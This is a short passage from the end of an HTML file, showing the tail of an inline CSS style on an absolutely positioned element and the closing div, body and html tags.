                    vertical-align: baseline;
                    white-space: normal;
                    word-spacing: normal;
                    position: absolute;
                    top: -1px;
                    left: -1px;
                    z-index: 600;
                "
            />
        </div>
    </body>
</html>
